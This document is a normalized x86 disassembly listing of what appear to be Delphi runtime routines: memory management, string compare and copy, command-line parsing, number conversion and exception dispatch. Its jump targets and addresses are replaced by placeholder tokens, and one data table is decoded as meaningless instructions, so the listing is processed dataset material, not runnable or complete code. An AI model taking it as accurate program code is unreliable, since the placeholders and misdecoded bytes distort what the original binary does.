cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a44
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405cc8
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405cc8
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405cc8
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405cc8
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4028f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4045a8
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029e4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f5c
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40125c
mov ecx eax
mov edx esp
mov eax ebx
call sub_40404c
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4028f8
mov edi eax
test esi esi
je r-xdata
sub_402a84
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402ad8
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402b30
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402b4c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bd0
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c40
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c60
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d40
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402d80
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e33 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e33 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_40306c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_40309c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40310d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_403188
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403230
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403288
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_40498c
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032a8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4055b0
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4032d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40335c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40336c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403363
lea eax [ ebp - 0x8 ]
call sub_405598
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032a8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4055b0
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40336c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033b0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403438
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4033f0
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403420
push eax
push ecx
mov eax [ eax ]
call sub_4033f0
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f50
call [ rw-data ]
sub_403468
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4033f0
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403490
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4034e0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403530
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403559
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4035c4
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403600
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403614
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403628
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403648
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403628
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036ac
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403160
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405cc8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403614
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4035c4
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4037d8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403160
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4035c4
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405cc8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403600
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
